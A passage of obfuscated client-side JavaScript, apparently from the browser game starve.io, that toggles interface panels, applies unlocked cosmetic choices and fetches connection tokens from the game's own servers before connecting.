			var ΔⲆΔⲆᐃᐃᐃ = Math.pow(2, ᐃⲆ++);
			var ᐃΔⵠⵠⲆΔᐃ = Math.pow(2, ᐃⲆ++);
			var ᐃΔⵠΔⵠ = Math.pow(ᐃⵠⲆⲆⲆ, ᐃⲆ++);
			var ᐃᐃⵠⲆⵠ = Math.pow(ᐃⲆⵠᐃ, ᐃⲆ++);
			var ⲆⵠΔⲆⵠ = Math.pow(ⵠΔⲆᐃ, ᐃⲆ++);
			var ᐃⲆΔⲆΔ = Math.pow(2, ᐃⲆ++);
			var ᐃΔⵠᐃⲆ = Math.pow(2, ᐃⲆ++);
			var ⵠᐃΔⲆΔ = Math.pow(2, ᐃⲆ++);
			var ⲆⲆⲆΔᐃⲆⲆ = Math.pow(2, ᐃⲆ++);
			var ⲆⵠᐃⲆⲆⲆᐃ = Math.pow(ⵠⲆⵠⲆ, ᐃⲆ++);
			var ᐃⲆᐃⵠⲆ = Math.pow(ⵠΔᐃᐃⵠ, ᐃⲆ++);
			this.ᐃⲆᐃⵠⲆ = ᐃⲆᐃⵠⲆ;
			var ᐃΔᐃᐃⵠ = Math.pow(2, ᐃⲆ++);
			this.ᐃΔᐃᐃⵠ = ᐃΔᐃᐃⵠ;
			var ⵠᐃⲆⵠⵠ = Math.pow(ᐃⵠⲆⲆⲆ, ᐃⲆ++);
			this.ⵠᐃⲆⵠⵠ = ⵠᐃⲆⵠⵠ;
			var ΔᐃΔᐃᐃⵠⵠ = Math.pow(2, ᐃⲆ++);
			this.ⲆⲆⲆⲆⵠ = ⲆⵠΔΔΔ;

			function ⲆΔᐃⵠⵠ(ⵠᐃⵠᐃ, ΔΔⲆΔ, ⵠΔⲆⵠᐃⲆᐃⲆΔ) {
				for (var ⵠᐃ = ⲆΔⵠ; ᐃᐃᐃ.ⵠⵠⲆᐃ.length > ⵠᐃ; ⵠᐃ++) {
					(ᐃᐃᐃ.ⵠⵠⲆᐃ[ⵠᐃ].view & ⵠᐃⵠᐃ) !== ᐃⵠⲆ && (ᐃᐃᐃ.ⵠⵠⲆᐃ[ⵠᐃ].active = ΔΔⲆΔ)
				}
				for (var ⵠᐃ = 0; ᐃᐃᐃ.buttons.length > ⵠᐃ; ⵠᐃ++) {
					0 !== (ᐃᐃᐃ.buttons[ⵠᐃ].view & ⵠᐃⵠᐃ) && (ᐃᐃᐃ.buttons[ⵠᐃ].info.active = ΔΔⲆΔ)
				}
				for (var ⵠᐃ = 0; ⵠᐃ < ᐃᐃᐃ.ᐃΔⵠΔΔ.length; ⵠᐃ++) {
					if (0 !== (ᐃᐃᐃ.ᐃΔⵠΔΔ[ⵠᐃ].view & ⵠᐃⵠᐃ)) ᐃᐃᐃ.ᐃΔⵠΔΔ[ⵠᐃ].style.display = ⵠΔⲆⵠᐃⲆᐃⲆΔ
				}
			}
			var ⵠΔΔΔⵠᐃΔ = [];
			this.ⵠⲆⲆᐃⵠᐃⵠ = 0;

			function ⵠⵠΔᐃΔⵠⲆᐃΔ(ΔⵠᐃⵠⵠⲆᐃ, ⲆⲆⲆⲆΔᐃⲆ) {
				ΔⵠᐃⵠⵠⲆᐃ = ΔⵠᐃⵠⵠⲆᐃ.replace("Xday", "day");
				ΔⵠᐃⵠⵠⲆᐃ = ΔⵠᐃⵠⵠⲆᐃ.replace("Xnight", "night");
				for (var ⵠᐃ = 0; ⵠΔΔΔⵠᐃΔ.length > ⵠᐃ; ⵠᐃ++) {
					var ⵠᐃⲆⵠᐃᐃⵠ = ⵠΔΔΔⵠᐃΔ[ⵠᐃ];
					if (ⵠᐃⲆⵠᐃᐃⵠ[Δⵠᐃ] === ΔⵠᐃⵠⵠⲆᐃ) {
						ⲆⲆⲆⲆΔᐃⲆ !== ⵠᐃⲆⵠᐃᐃⵠ[1] && (ⵠⲆᐃΔ.ⵠⲆⲆᐃⵠᐃⵠ = ΔΔΔ);
						return
					}
				}
				ⵠΔΔΔⵠᐃΔ.push([ΔⵠᐃⵠⵠⲆᐃ, ⲆⲆⲆⲆΔᐃⲆ])
			}

			function ᐃΔⵠⲆᐃΔⲆ() {
				var ᐃΔΔΔⲆⲆΔ = Number(ΔΔᐃᐃ.get("starve_crate"));
				var ⲆᐃᐃⲆⲆⲆᐃ = Number(ΔΔᐃᐃ.get("starve_dead"));
				var ΔⵠᐃⲆⵠᐃΔ = Number(ΔΔᐃᐃ.get("starve_book"));
				var ΔᐃᐃⵠⲆⲆⵠ = Number(ΔΔᐃᐃ.get("starve_bag"));
				var ᐃΔΔⲆΔⲆΔ = Number(ΔΔᐃᐃ.get("starve_skin"));
				var ΔᐃⲆⵠⵠⲆᐃ = Number(ΔΔᐃᐃ.get("starve_accessory"));
				!(ⵠⲆᐃΔ.unlock.ⲆⵠⲆᐃ[ⵠⲆᐃΔ.ⲆⵠⲆᐃ] > ⲆΔⵠ) && (ⵠⲆᐃΔ.ⲆⵠⲆᐃ = !(ⵠⲆᐃΔ.unlock.ⲆⵠⲆᐃ[ᐃΔΔⲆΔⲆΔ] > ᐃⵠⲆⵠ) ? ⲆⲆⲆᐃ : ᐃΔΔⲆΔⲆΔ);
				if (!(ⵠⲆᐃΔ.unlock.ⵠⲆᐃⵠⵠ[ⵠⲆᐃΔ.ⵠⲆᐃⵠⵠ] > ⵠΔⲆⵠ)) ⵠⲆᐃΔ.ⵠⲆᐃⵠⵠ = !(ⵠⲆᐃΔ.unlock.ⵠⲆᐃⵠⵠ[ΔⵠᐃⲆⵠᐃΔ] > ⵠⲆᐃⵠ) ? ΔΔⵠ : ΔⵠᐃⲆⵠᐃΔ;
				!(ⵠⲆᐃΔ.unlock.ᐃⲆⵠΔⵠ[ⵠⲆᐃΔ.ᐃⲆⵠΔⵠ] > 0) && (ⵠⲆᐃΔ.ᐃⲆⵠΔⵠ = !(ⵠⲆᐃΔ.unlock.ᐃⲆⵠΔⵠ[ⲆᐃᐃⲆⲆⲆᐃ] > 0) ? 0 : ⲆᐃᐃⲆⲆⲆᐃ);
				!(ⵠⲆᐃΔ.unlock.ⲆᐃⲆⲆᐃ[ⵠⲆᐃΔ.ⲆᐃⲆⲆᐃ] > ᐃⵠⲆⵠ) && (ⵠⲆᐃΔ.ⲆᐃⲆⲆᐃ = !(ⵠⲆᐃΔ.unlock.ⲆᐃⲆⲆᐃ[ᐃΔΔΔⲆⲆΔ] > 0) ? ⵠⲆᐃⵠ : ᐃΔΔΔⲆⲆΔ);
				if (!(ⵠⲆᐃΔ.unlock.Δᐃᐃⵠᐃ[ⵠⲆᐃΔ.Δᐃᐃⵠᐃ] > 0)) ⵠⲆᐃΔ.Δᐃᐃⵠᐃ = !(ⵠⲆᐃΔ.unlock.Δᐃᐃⵠᐃ[ΔᐃⲆⵠⵠⲆᐃ] > ᐃⵠΔ) ? 0 : ΔᐃⲆⵠⵠⲆᐃ;
				!(ⵠⲆᐃΔ.unlock.ΔⵠΔᐃⲆ[ⵠⲆᐃΔ.ΔⵠΔᐃⲆ] > ᐃⵠⲆⵠ) && (ⵠⲆᐃΔ.ΔⵠΔᐃⲆ = !(ⵠⲆᐃΔ.unlock.ΔⵠΔᐃⲆ[ΔᐃᐃⵠⲆⲆⵠ] > Δᐃᐃᐃ) ? ⵠᐃⲆᐃ : ΔᐃᐃⵠⲆⲆⵠ)
			}

			function ⲆΔᐃⵠ(ⵠᐃⵠᐃ) {
				if (ᐃᐃᐃ.ΔᐃᐃΔⲆⵠⵠ === false) return;
				ⲆΔᐃⵠⵠ(ⵠⵠⵠⲆΔⵠⵠ, ⲆᐃⲆⲆ, ⵠ[465]);
				ⲆΔᐃⵠⵠ(ⵠⵠᐃᐃⵠᐃⵠ, ⲆᐃⲆⲆ, ⵠ[465]);
				ᐃΔⵠⲆᐃΔⲆ();
				if (ⵠᐃⵠᐃ === ᐃᐃᐃ.ⲆⲆⲆⲆⵠ || ᐃᐃᐃ.ⵠΔΔΔⵠ >= ΔⲆⵠ) return;
				ⲆⵠΔΔΔ === ⵠᐃⵠᐃ || ΔᐃⵠⵠΔ === ⵠᐃⵠᐃ || Ⲇⵠᐃⵠᐃ === ⵠᐃⵠᐃ || ᐃⲆⵠⲆⲆ === ⵠᐃⵠᐃ || ⵠᐃⵠᐃ === ⲆΔⵠⵠΔ || ⵠᐃⵠᐃ === ᐃᐃᐃⲆᐃᐃⵠ ? ᐃᐃᐃ.ΔⲆⵠⵠⲆ.style.display = ⵠ[35] : ᐃᐃᐃ.ΔⲆⵠⵠⲆ.style.display = ⵠ[465];
				ⲆΔᐃⵠⵠ(ᐃᐃᐃ.ⲆⲆⲆⲆⵠ, ⲆᐃⲆⲆ, ⵠ[465]);
				ᐃᐃᐃ.ⲆⲆⲆⲆⵠ = ⵠᐃⵠᐃ;
				ⲆΔᐃⵠⵠ(ᐃᐃᐃ.ⲆⲆⲆⲆⵠ, ⵠⵠᐃΔ, ⵠ[35])
			}

			function ΔⵠΔΔⲆⵠΔⵠⲆ(ⲆⲆⲆΔᐃⵠΔ) {
				ⲆⲆⲆΔᐃⵠΔ = ⲆⲆⲆΔᐃⵠΔ.replace("http://starve.io", "https://starve.io");
				var ΔⲆⲆᐃ = new XMLHttpRequest;
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("HEAD", ⲆⲆⲆΔᐃⵠΔ, true);
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
					if (4 === ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[41]]) {
						if (ΔⲆⲆᐃ.status === 200) {
							var ⲆⲆΔⲆⵠ = Number(ΔⲆⲆᐃ.getResponseHeader("Content-Length"));
							ⲆⲆΔⲆⵠ > 0 && ⵠⵠΔᐃΔⵠⲆᐃΔ(ⲆⲆⲆΔᐃⵠΔ, ⲆⲆΔⲆⵠ)
						}
					}
				};
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]](null)
			}
			this.ⲆΔᐃⵠ = ⲆΔᐃⵠ;

			function ᐃᐃⵠΔⵠΔⵠ(callback) {
				if (undefined === ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ) return;
				if (undefined === ᐃᐃΔ.ΔΔᐃⲆᐃⲆⲆ) return;
				if (ᐃᐃΔ.ⲆΔᐃΔⵠΔⲆ === undefined) return;
				if (ᐃᐃΔ.ⲆΔⵠᐃᐃⵠⲆ === ΔΔΔⲆΔ) return;
				callback()
			}

			function ⵠΔⵠΔΔⲆⵠᐃᐃ() {
				ᐃΔⵠⲆᐃΔⲆ();
				ΔⵠⲆᐃ.connect()
			}

			function ⲆⲆΔΔΔᐃⲆ(ⲆⲆⲆⲆ, ⲆⵠᐃⲆᐃⲆⲆ, ⲆΔΔᐃᐃⵠⲆ) {
				const ΔⲆⲆᐃ = new XMLHttpRequest;
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], ⲆⲆⲆⲆ);
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[255]](ⵠ[550], ⵠ[82]);
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
					if (ᐃⵠⵠΔ == this[ΔᐃⲆⵠⲆⵠΔ[41]] && this.status == 200) {
						ⲆⵠᐃⲆᐃⲆⲆ !== ᐃⵠᐃⵠᐃ && ⲆⵠᐃⲆᐃⲆⲆ(ΔⲆⲆᐃ.responseText)
					} else if (this[ΔᐃⲆⵠⲆⵠΔ[41]] == 4) {
						ΔΔΔⲆΔ !== ⲆΔΔᐃᐃⵠⲆ && ⲆΔΔᐃᐃⵠⲆ()
					}
				};
				ΔⲆⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
			}
			this.ᐃⲆⲆⲆⲆᐃⵠ = function(callback, ᐃⵠΔⵠΔΔⲆ) {
				let stop = ᐃⵠⲆⵠ;
				let ⵠⲆⲆⲆΔᐃⲆ = "0";
				if (ΔⵠΔⲆᐃ) ⵠⲆⲆⲆΔᐃⲆ = ΔⵠΔⲆᐃ + ᐃⲆⵠⵠᐃᐃᐃ.ΔⲆᐃⵠⲆᐃΔ();
				if (ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ) ᐃᐃⵠΔⵠΔⵠ(callback);
				else ⲆⲆΔΔΔᐃⲆ(`${Ⲇᐃᐃⵠᐃ}token?id=${ⵠⲆⲆⲆΔᐃⲆ}`, (function(ᐃΔΔⲆⲆ) {
					if (ⵠⲆΔ === stop) return;
					const ΔⵠⵠⵠⲆ = ᐃΔΔⲆⲆ.split("_");
					const ᐃΔΔΔⲆ = ΔⵠⵠⵠⲆ[ⲆΔⵠ] + "_";
					const ΔⵠᐃΔ = Number(ΔⵠⵠⵠⲆ[1]);
					const ⲆΔⵠᐃⵠ = Math.abs(ΔⲆΔᐃΔΔⵠ(ΔⵠᐃΔ));
					ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ = ᐃΔΔΔⲆ + ⲆΔⵠᐃⵠ;
					ᐃᐃⵠΔⵠΔⵠ(callback)
				}), (function() {
					if (stop === ΔⲆᐃᐃ) return;
					if (ᐃⵠΔⵠΔΔⲆ === ⵠᐃⵠΔ) {
						stop = ⵠΔⲆ;
						callback();
						return
					}
					ᐃᐃᐃ.waiting = ΔⵠΔⲆΔ
				}));
				ⲆⲆΔΔΔᐃⲆ(`${ᐃⵠᐃΔⲆ}let`, (function(ᐃΔΔⲆⲆ) {
					if (Ⲇᐃⵠ === stop) return;
					const ⵠᐃΔⵠᐃⲆΔ = 201;
					const ⵠᐃⵠⵠⲆᐃⲆᐃⵠ = Math.floor(ⵠᐃΔⵠᐃⲆΔ[ⵠᐃΔⵠᐃⲆΔ.ⵠᐃΔⵠᐃⲆΔ]);
					var ⲆΔᐃⲆΔᐃΔⲆⵠ = 140;
					let ΔⵠⵠᐃΔΔⲆⵠⵠ = 206;
					const ⵠⵠⵠΔᐃⲆᐃⲆΔ = 111;
					ΔⵠⵠᐃΔΔⲆⵠⵠ <= ⵠⵠⵠΔᐃⲆᐃⲆΔ && (ⲆΔᐃⲆΔᐃΔⲆⵠ = Δᐃⵠⵠ);
					ᐃΔΔⲆⲆ = ᐃΔΔⲆⲆ.split(":");
					var ᐃⵠᐃⵠᐃᐃⵠΔⲆ = 224;
					var ⲆⲆᐃⲆⵠᐃᐃᐃᐃ = 84;
					const ⵠΔⵠᐃⲆᐃΔΔⵠ = 113;
					if (ⲆⲆᐃⲆⵠᐃᐃᐃᐃ == ⵠΔⵠᐃⲆᐃΔΔⵠ) ᐃⵠᐃⵠᐃᐃⵠΔⲆ = 248;
					var ⲆᐃΔΔⲆⵠⲆᐃⵠ = 39;
					const ⵠΔⲆΔⵠⲆⲆⵠᐃ = 9;
					let ΔᐃᐃᐃⲆⲆᐃᐃⵠ = {};
					ΔᐃᐃᐃⲆⲆᐃᐃⵠ.ᐃᐃⵠⲆⲆΔⲆΔᐃ = 9;
					const ⲆⲆⵠⵠⲆⲆⵠⲆⲆ = 19 * 244;
					var ⲆⵠᐃᐃᐃⲆⵠⲆᐃ = 219;
					ⵠΔⲆΔⵠⲆⲆⵠᐃ == ⲆⵠᐃᐃᐃⲆⵠⲆᐃ && (ⲆᐃΔΔⲆⵠⲆᐃⵠ = 219);
					var ⲆᐃΔΔⵠⵠᐃᐃᐃ, ΔⲆⵠⵠⲆΔΔⵠⵠ, ΔΔⵠΔⵠΔⵠⵠΔ;
					var ⵠⵠⵠᐃⵠᐃΔ = 126;
					ⵠⵠⵠᐃⵠᐃΔ === ᐃⲆⲆΔⵠ && (ⵠⵠⵠᐃⵠᐃΔ = 227);
					const ΔⲆⲆⵠΔⲆᐃᐃᐃ = 104;
					ΔⲆⲆⵠΔⲆᐃᐃᐃ.ΔΔΔⲆⲆᐃΔⵠᐃ = ⲆⲆᐃⵠΔ;
					const ᐃⵠⵠΔᐃᐃⵠΔⵠ = {};
					ᐃⵠⵠΔᐃᐃⵠΔⵠ.ᐃⵠΔᐃⲆΔⵠⲆᐃ = ΔⲆⵠⲆ;
					let ᐃⲆⵠⲆᐃⲆᐃⵠⲆ = 230;
					let ⲆⲆᐃᐃᐃᐃᐃᐃᐃ = ᐃⲆⵠⲆᐃⲆᐃⵠⲆ;
					var ⵠⲆⵠⲆᐃⲆⵠᐃⲆ, ⲆⵠΔⲆⲆⲆⵠⲆᐃ, ΔⵠⲆᐃⵠⵠΔᐃΔ, ᐃⲆⲆΔΔΔᐃⵠΔ;
					var ⲆⲆⲆⲆᐃⵠⲆⲆΔ, ᐃⲆⲆⲆΔⵠΔᐃⲆ, ΔᐃⵠᐃⲆⵠΔᐃΔ;
					var ΔᐃΔΔⲆΔᐃᐃⲆ = 216;
					var ⲆΔᐃⵠⵠΔⲆⲆⵠ = 52;
					const ᐃⲆⲆᐃᐃΔᐃᐃⲆ = 49;
					if (ⲆΔᐃⵠⵠΔⲆⲆⵠ >= ᐃⲆⲆᐃᐃΔᐃᐃⲆ) ΔᐃΔΔⲆΔᐃᐃⲆ = 157;
					var ᐃⲆΔᐃⵠΔΔᐃⲆ = 79;
					var ⵠⵠΔΔⵠᐃᐃⲆΔ = 137;
					var ΔⲆⵠⵠⵠⲆⲆΔᐃ = 114;
					let ⲆΔᐃⲆⲆΔⲆⲆΔ = 229;
					if (ΔⲆⵠⵠⵠⲆⲆΔᐃ > ⲆΔᐃⲆⲆΔⲆⲆΔ) ⵠⵠΔΔⵠᐃᐃⲆΔ = 221;
					var ΔⲆΔᐃᐃⲆⲆ = 240;
					const ⵠΔⵠᐃⲆᐃⵠΔⵠ = 150;
					const ⲆⵠⵠⲆⵠⲆⲆΔΔ = ⵠΔⵠᐃⲆᐃⵠΔⵠ;
					if (14 == ΔⲆΔᐃᐃⲆⲆ) ΔⲆΔᐃᐃⲆⲆ = 3;
					let ⵠΔⵠⲆΔΔⲆΔⵠ = 216;
					const ΔⲆᐃΔⵠᐃⲆΔⲆ = 115;
					if (ΔⲆᐃΔⵠᐃⲆΔⲆ == ⵠΔⵠⲆΔΔⲆΔⵠ) ᐃⲆΔᐃⵠΔΔᐃⲆ = 22;
					let ⲆΔⵠΔΔⵠⵠᐃΔ = 6 - 92; {
						var ᐃⲆΔΔⲆᐃⲆΔⲆ = 33;
						let ΔΔᐃⵠᐃᐃⵠΔⲆ = 49;
						var ᐃⵠⵠᐃⵠᐃⵠⵠᐃ = 224;
						ᐃⵠⵠᐃⵠᐃⵠⵠᐃ <= ΔΔᐃⵠᐃᐃⵠΔⲆ && (ᐃⲆΔΔⲆᐃⲆΔⲆ = 35);
						var ΔᐃΔⵠⵠᐃᐃᐃΔ = 248;
						const ΔᐃΔᐃⵠⵠⲆΔΔ = 220;
						let ᐃΔΔⵠΔᐃᐃⵠⲆ = 26;
						ᐃΔΔⵠΔᐃᐃⵠⲆ === ΔᐃΔᐃⵠⵠⲆΔΔ && (ΔᐃΔⵠⵠᐃᐃᐃΔ = 39);
						const ΔⵠⵠⵠⲆ = ᐃΔΔⲆⲆ[0].split("_");
						const ᐃΔΔΔⲆ = ΔⵠⵠⵠⲆ[ΔⲆⲆ] + "_";
						var ⲆᐃⵠⲆᐃⵠΔᐃΔ = 183;
						const ΔⵠᐃΔ = Number(ΔⵠⵠⵠⲆ[1]);
						const ΔᐃΔΔⵠΔⲆⵠⵠ = 153;
						const ⲆΔⵠᐃⵠ = Math.abs(ᐃⵠΔᐃⲆⵠⲆᐃⵠ(ΔⵠᐃΔ));
						var ⵠⵠΔⲆΔⵠᐃᐃΔ = 153;
						let ⵠΔᐃᐃΔΔΔⵠⲆ = 309 * 4096;
						var ΔΔⵠⵠΔᐃⵠⵠΔ;
						let ⵠΔⲆᐃⲆΔⵠⲆΔ = 113 + 62;
						var ΔᐃⲆΔⲆΔᐃⵠⲆ, ΔΔᐃⲆⵠⵠᐃⲆⵠ, ⵠᐃᐃᐃΔᐃⵠΔΔ, ⲆᐃⵠⵠⲆΔⵠᐃᐃ;
						const ᐃⲆⲆᐃⲆᐃⵠⲆᐃ = 63;
						const ⲆᐃⲆⵠᐃΔΔⵠΔ = 214;
						ⲆᐃⲆⵠᐃΔΔⵠΔ > ᐃⲆⲆᐃⲆᐃⵠⲆᐃ && (ⵠⵠΔⲆΔⵠᐃᐃΔ = 173);
						ᐃᐃΔ.ΔΔᐃⲆᐃⲆⲆ = ᐃΔΔΔⲆ + ⲆΔⵠᐃⵠ;
						ᐃᐃΔ.ⲆⲆⲆⵠΔᐃᐃ = ⲆΔⵠᐃⵠ
					} {
						let ΔΔⵠΔⵠΔⵠⲆΔ = 157;
						const ΔⵠⵠⵠⲆ = ᐃΔΔⲆⲆ[ΔⲆⵠ].split("_");
						const ᐃΔΔΔⲆ = ΔⵠⵠⵠⲆ[0] + "_";
						const ΔⵠᐃΔ = Number(ΔⵠⵠⵠⲆ[1]);
						var ᐃⵠΔΔⵠⲆᐃᐃΔ = 76;
						let ΔⲆΔᐃΔⵠΔᐃⵠ = 110;
						const ⵠᐃΔⲆᐃⵠⲆⲆΔ = 50;
						const ⵠΔⲆⲆΔⲆΔⵠΔ = 142;
						const ⲆⵠΔⵠⵠΔⵠΔⵠ = ΔⲆΔᐃΔⵠΔᐃⵠ;
						if (ⵠᐃΔⲆᐃⵠⲆⲆΔ < ⵠΔⲆⲆΔⲆΔⵠΔ) ᐃⵠΔΔⵠⲆᐃᐃΔ = 93;
						var ⲆᐃᐃᐃⲆⵠᐃⵠᐃ = 178;
						const ᐃⲆⲆᐃⵠⵠⵠⲆⵠ = ⵠⵠΔⵠᐃ + 209 << ΔⲆⵠΔⵠ;
						const ⵠᐃΔΔⲆⵠⲆᐃⲆ = 246;
						var ᐃⵠᐃⵠⵠᐃᐃⵠⲆ = 248;
						const ⵠΔⵠⵠΔΔⵠΔⵠ = 148;
						var ΔΔΔⵠⲆⵠᐃΔΔ = 16;
						var ⵠΔᐃᐃⲆⵠⵠΔⲆ = 241;
						let ⵠᐃΔᐃᐃⵠⵠⵠᐃ = 254;
						var ⵠᐃΔᐃⲆᐃⵠΔᐃ = 127;
						ⵠᐃΔᐃᐃⵠⵠⵠᐃ > ⵠᐃΔᐃⲆᐃⵠΔᐃ && (ⵠΔᐃᐃⲆⵠⵠΔⲆ = 66);
						if (ΔΔΔⵠⲆⵠᐃΔΔ == ⵠΔⵠⵠΔΔⵠΔⵠ) ᐃⵠᐃⵠⵠᐃᐃⵠⲆ = ⲆⵠΔⲆⲆⵠⲆ;
						let ⲆⲆᐃⲆΔᐃᐃᐃⵠ = 34;
						if (ⲆⲆᐃⲆΔᐃᐃᐃⵠ <= ⵠᐃΔΔⲆⵠⲆᐃⲆ) ⲆᐃᐃᐃⲆⵠᐃⵠᐃ = 237;
						const ⲆΔⵠᐃⵠ = Math.abs(ᐃⲆⵠΔᐃΔΔ(ΔⵠᐃΔ));
						var ⵠΔᐃⲆΔΔⲆ = 225;
						const ΔⲆΔⲆΔⵠᐃΔΔ = ⲆΔⲆᐃ;
						const ᐃᐃᐃⵠᐃⲆⵠΔᐃ = ΔⲆΔⲆΔⵠᐃΔΔ;
						ⵠΔᐃⲆΔΔⲆ >= ⵠᐃΔⵠ && (ⵠΔᐃⲆΔΔⲆ = 103);
						var ΔⲆᐃⵠΔⵠⵠᐃΔ = 208;
						var ⵠᐃⲆΔⲆⲆᐃᐃⲆ = ΔⲆᐃⵠΔⵠⵠᐃΔ;
						ᐃᐃΔ.ⲆΔᐃΔⵠΔⲆ = ᐃΔΔΔⲆ + ⲆΔⵠᐃⵠ;
						var ᐃΔΔⲆⲆᐃⲆⲆᐃ = 38;
						let ⵠⵠᐃⵠᐃⲆⵠⵠⵠ = 79;
						const ᐃⲆᐃⲆⲆᐃΔᐃⲆ = 34;
						ⵠⵠᐃⵠᐃⲆⵠⵠⵠ == ᐃⲆᐃⲆⲆᐃΔᐃⲆ && (ᐃΔΔⲆⲆᐃⲆⲆᐃ = 141);
						var ⲆᐃⵠᐃᐃΔΔⵠΔ, ᐃⵠΔⵠΔᐃΔᐃⵠ;
						const ΔⲆΔⵠⵠⲆⵠⲆᐃ = {};
						ΔⲆΔⵠⵠⲆⵠⲆᐃ.ᐃⲆᐃᐃᐃⲆᐃⵠⲆ = ⲆⵠΔⲆⲆⵠⲆ;
						var ΔᐃΔΔᐃΔⲆ = 147;
						if (ΔᐃΔΔᐃΔⲆ === ᐃᐃⲆⲆ) ΔᐃΔΔᐃΔⲆ = 195;
						ᐃᐃΔ.ᐃⵠᐃⵠⵠᐃⲆⲆᐃ = ⲆΔⵠᐃⵠ;
						var ᐃΔⲆᐃⲆⵠΔⵠᐃ = 200 + 191
					} {
						var ⲆⵠⲆⵠΔⲆⲆ = 195;
						var ΔᐃⲆⵠⲆᐃΔᐃⵠ = 27280;
						0 <= ⲆⵠⲆⵠΔⲆⲆ && (ⲆⵠⲆⵠΔⲆⲆ = 105);
						var ΔⲆᐃᐃΔΔⵠΔΔ = 85;
						var ᐃΔΔᐃᐃⲆⲆⵠᐃ = 245;
						let ⲆᐃΔᐃΔᐃᐃⵠᐃ = 132;
						let ᐃΔᐃΔⵠⵠⲆᐃⲆ = 199;
						ⲆᐃΔᐃΔᐃᐃⵠᐃ >= ᐃΔᐃΔⵠⵠⲆᐃⲆ && (ᐃΔΔᐃᐃⲆⲆⵠᐃ = 181);
						const ΔⵠⵠⵠⲆ = ᐃΔΔⲆⲆ[ᐃⲆΔⲆ].split("_");
						const ᐃΔΔΔⲆ = ΔⵠⵠⵠⲆ[Ⲇᐃᐃᐃ] + "_";
						const ΔⵠᐃΔ = Number(ΔⵠⵠⵠⲆ[1]);
						var ⵠⲆᐃⵠⵠⲆⵠⲆⲆ = 108;
						var ⲆⵠⲆᐃⲆΔᐃΔΔ = 88;
						var ⵠᐃⵠⵠᐃⲆΔⲆΔ = 5;
						const ⵠᐃⵠⵠΔΔⵠᐃⵠ = 100;
						if (ⵠᐃⵠⵠΔΔⵠᐃⵠ < ⵠᐃⵠⵠᐃⲆΔⲆΔ) ⲆⵠⲆᐃⲆΔᐃΔΔ = 133;
						let ⲆⵠⵠⲆᐃΔⵠᐃⵠ = 222;
						var ⵠΔⲆᐃΔⵠᐃ = 240;
						if (ⵠΔⲆᐃΔⵠᐃ >= ΔΔΔΔΔ) ⵠΔⲆᐃΔⵠᐃ = 69;
						var ⲆΔᐃⵠⵠᐃᐃᐃⲆ = 57;
						if (ⲆⵠⵠⲆᐃΔⵠᐃⵠ >= ⲆΔᐃⵠⵠᐃᐃᐃⲆ) ⵠⲆᐃⵠⵠⲆⵠⲆⲆ = 7;
						const ⲆΔⵠᐃⵠ = Math.abs(ᐃⲆⵠΔᐃΔΔ(ΔⵠᐃΔ));
						ᐃᐃΔ.ⲆΔⵠᐃᐃⵠⲆ = ᐃΔΔΔⲆ + ⲆΔⵠᐃⵠ;
						ᐃᐃΔ.ⲆᐃⲆΔΔᐃⵠᐃΔ = ⲆΔⵠᐃⵠ
					}
					ᐃᐃⵠΔⵠΔⵠ(callback)
				}), (function() {
					if (stop === ΔⲆᐃᐃ) return;
					if (ᐃⲆᐃ === ᐃⵠΔⵠΔΔⲆ) {
						stop = 1;
						callback();
						return
					}
					ᐃᐃᐃ.waiting = false
				}))
			};
			this.ⲆᐃΔᐃⵠΔⵠ = function() {
				ᐃᐃᐃ.waiting === ᐃⵠⵠᐃΔ && (ᐃᐃΔ.reconnect.enabled = false, ᐃᐃᐃ.waiting = true, ᐃᐃᐃ.ᐃⲆⲆⲆⲆᐃⵠ(ⵠΔⵠΔΔⲆⵠᐃᐃ))
			};
			var ΔⲆᐃⵠ = 1;
			var ΔⵠⲆⵠⲆ = 2;
			var ⲆΔⵠⲆ = ΔⲆⲆⲆ;
			var ⵠⵠΔⵠᐃⵠⵠ = ⵠⵠⲆⵠΔ;
			var ΔⲆⲆⵠ = ΔⵠⲆⵠᐃⵠⲆ;
			var ⵠⲆΔᐃⲆⲆⲆ = 32;
			var ᐃΔᐃΔΔᐃⵠᐃⲆ = 0;
			var ᐃΔⲆⵠ = 1;
			var Ⲇⵠᐃᐃ = Ⲇᐃⵠⵠ;
			var ᐃⵠⲆⵠⲆⵠⲆ = 1;
			var ⲆᐃⲆⲆ = ΔⲆⲆ;
			var ⵠⵠᐃΔ = ⲆⵠⲆⲆ;
			ᐃⲆᐃΔᐃⵠᐃ.innerWidth < 1300 ? this.ⵠΔⵠⲆᐃ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[564]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[564]).style,
				input: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]),
				active: ⵠⵠᐃΔ,
				position: ⲆΔⵠⲆ | ΔⲆᐃⵠ,
				view: ⲆⵠΔΔΔ,
				translate: {
					x: 0,
					"ᐃΔⵠᐃᐃ": 200,
					y: 0,
					"ᐃᐃΔⵠⵠ": 184
				}
			} : this.ⵠΔⵠⲆᐃ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[564]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[564]).style,
				input: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]),
				active: ⵠⵠᐃΔ,
				position: ⲆΔⵠⲆ | ΔⲆⲆⵠ,
				view: ⲆⵠΔΔΔ,
				translate: {
					y: ⵠᐃⲆᐃ,
					x: ΔᐃΔΔ,
					"ᐃᐃΔⵠⵠ": 184,
					"ᐃΔⵠᐃᐃ": -180
				}
			};
			this.ⵠΔⵠⲆᐃ.id[ΔᐃⲆⵠⲆⵠΔ[277]]("keyup", (function(event) {
				event.preventDefault();
